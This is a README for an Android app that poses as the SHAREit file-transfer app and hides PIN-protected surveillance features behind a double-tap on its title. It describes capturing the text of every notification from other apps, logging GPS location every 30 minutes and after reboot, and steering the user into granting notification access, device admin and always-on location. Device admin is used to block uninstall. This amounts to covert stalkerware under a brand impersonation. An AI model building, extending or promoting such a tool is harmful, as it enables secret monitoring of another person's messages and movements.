# SHAREit (ShareDrop Radar Vault)

Android app styled like **SHAREit** on the surface, with hidden PIN-protected tools for notification logging, location history, and passcode management.

| Field | Value |
|--------|--------|
| **Display name** | SHAREit |
| **Application ID** | `shareit.new.io` |
| **Kotlin namespace** | `io.shareit.transfer` |
| **Min SDK** | 24 |
| **Target SDK** | 36 |

---

## Overview

The home screen looks like a normal file-transfer app (**Send**, **Receive**, **Files**). Secret features are unlocked from the home screen with a 6-digit passcode. All captured data is stored locally in app-private storage only.

**Default passcode:** `186100` (can be changed in-app; see [Change PIN](#change-pin)).

---

## Public UI (SHAREit-style)

### Home

- Blue SHAREit-themed layout with storage usage card.
- Three main actions: **Send**, **Receive**, **Files**.
- **Double-tap** the **SHAREit** title in the top bar to reveal hidden floating buttons (double-tap again to hide them).

### Send

- Opens a **radar scanning** screen with a Lottie animation (`assets/lottie_radar.json`).
- Scans for nearby Bluetooth devices (paired + discovered).
- Prompts to enable Bluetooth if it is off.
- Tap a device to send a file via a simple app-to-app Bluetooth channel.
- **Note:** This is a minimal custom protocol, not compatible with the real SHAREit app.

### Receive

- Shows a QR image and starts a Bluetooth receive server.
- Incoming files are saved under:
  - `Android/data/shareit.new.io/files/Download/bt_incoming/`

### Files

- Browse device media via **MediaStore** in three tabs:
  - **Videos**
  - **Music**
  - **Photos**
- Requests media read permissions when opened (`READ_MEDIA_*` on Android 13+, legacy storage permission on older versions).

---

## Hidden access

1. Open the app home screen.
2. **Double-tap** the **SHAREit** title in the top bar.
3. Three secret buttons appear:
   - **Change PIN**
   - **Location**
   - **Notifications**
4. **Notifications** and **Location** require the current 6-digit passcode.
5. **Change PIN** opens the passcode change flow directly (current passcode required as the first step).

---

## Startup permission flow

On first launch, the app walks through these steps in order (each opens system settings or a runtime prompt when needed):

1. **Post notifications** (Android 13+)
2. **Notification listener access** — required to capture notifications
3. **Device admin** — used for uninstall protection
4. **Ignore battery optimizations** — helps background work stay alive
5. **Location** (fine + coarse) — required for location tracking

Grant **“Allow all the time”** for location when prompted on the Location screen so 30-minute background saves work reliably.

---

## Notifications (hidden)

### Capture

- `NotificationCaptureService` listens to all system notifications.
- Each notification is saved as a JSON line with title, text, sub-text, big text, app label, package name, timestamp, and a unique ID.
- **Skipped:**
  - Notifications from this app itself
  - YouTube-family apps:
    - `com.google.android.youtube`
    - `com.google.android.apps.youtube.music`
    - `com.google.android.youtube.tv`
    - `com.google.android.apps.youtube.kids`
    - `com.google.android.apps.youtube.creator`
- Empty notifications (no title and no message body) are not saved.

### Viewer

After entering the passcode:

- **Search** across title, message, app name, and package name.
- **App filter chips** — filter by app; clear all notifications for one app from the chip delete icon.
- **Dropdown filter** in the top bar (same app list).
- **Grouped by title** when a single app is selected — tap a title group to see all messages under that title.
- **Pagination** — 20 items per page with Previous / Next on:
  - Main list
  - App title groups
  - Title detail list
- **Refresh** to reload from disk.
- **Clear all** to wipe every saved notification.
- **Shield icon** (when device admin is active) — enter passcode area, then disable uninstall protection so the app can be removed from system settings.

---

## Location (hidden)

### Capture

- Background **WorkManager** job saves GPS location every **30 minutes**.
- Reschedules after device **boot** (`BootReceiver`).
- Manual **Refresh** on the Location screen saves a point immediately.
- Reverse geocoding adds a human-readable address when available.
- Requires location permission; background location is recommended for saves when the app is closed.

### Viewer

After entering the passcode:

#### Current location card

- Shows the most recent saved point (address, coordinates, time, accuracy).
- **Copy** button — copies address, coordinates, time, and accuracy to the clipboard.

#### Last 24 hours

- **Map loads automatically** with all points from the last 24 hours (OpenStreetMap via osmdroid).
- Path line connects points in time order; markers show each save.
- Paginated history list (**15 per page**) with **Copy** on each row.

#### Older (more than 24 hours)

- Listed separately with pagination (**15 per page**).
- **No map by default** — tap **Load map** on a row to show that point on a map; tap **Hide map** to close it.
- **Copy** on every row.

#### Other actions

- **Clear history** — deletes all saved location points.
- Map tiles need **internet**; saved coordinates remain available offline.

---

## Change PIN

- Open from the hidden **Change PIN** floating button on the home screen.
- Three-step flow:
  1. Enter **current** 6-digit passcode
  2. Enter **new** 6-digit passcode
  3. **Confirm** new passcode
- Saved in app-private `SharedPreferences` (`secret_access`).
- Applies immediately to **Notifications** and **Location** unlock screens.
- Default passcode if never changed: `186100`.

---

## Uninstall protection

- During setup, the app can activate **device admin** to block easy uninstall while protection is on.
- There is **no visible uninstall option** inside the app UI.
- To allow uninstall:
  1. Open hidden **Notifications** (passcode required).
  2. Tap the **shield** icon in the top bar.
  3. Confirm — device admin is removed and a toast confirms you can uninstall from system settings.

---

## Local storage

| Data | Path |
|------|------|
| Notifications | `files/captured_notifications/stream.jsonl` |
| Location history | `files/location_history/points.jsonl` |
| Passcode | `SharedPreferences` → `secret_access` / `pin` |
| Bluetooth receives | `Android/data/shareit.new.io/files/Download/bt_incoming/` |

### Notification file format

One JSON object per line, for example:

```json
{"pkg":"com.example.app","app":"Example","title":"Hello","text":"World","sub":"","big":"","ts":1781660379039,"key":"…","id":"uuid-or-legacy-id"}
```

Rotation keeps roughly the last **5000** notification entries.

### Location file format

One JSON object per line, for example:

```json
{"lat":23.8103,"lng":90.4125,"acc":12.5,"ts":1781660379039,"addr":"Dhaka, Bangladesh"}
```

Rotation keeps roughly the last **2000** location points.

---

## Tech stack

- **Kotlin** + **Jetpack Compose** (Material 3)
- **Lottie Compose** — radar animation on Send screen
- **Coil** — image loading
- **WorkManager** — periodic location capture (30 min)
- **Play Services Location** — fused location provider
- **osmdroid** — OpenStreetMap tiles (no Google Maps API key)
- **Bluetooth RFCOMM** — minimal file send/receive between devices running this app

---

## Build

```bash
./gradlew :app:assembleDebug
```

Output APK:

```
app/build/outputs/apk/debug/app-debug.apk
```

Install on a device or emulator with Google Play services for best location support.

---

## Limitations

- Bluetooth transfer works **only between devices running this app**, not with official SHAREit.
- Location interval is **30 minutes** (Android may defer WorkManager jobs under battery saver).
- Notification and location data stay **on device only** unless exported manually.
- Changing the passcode does not encrypt stored notification/location files — it only protects in-app access.
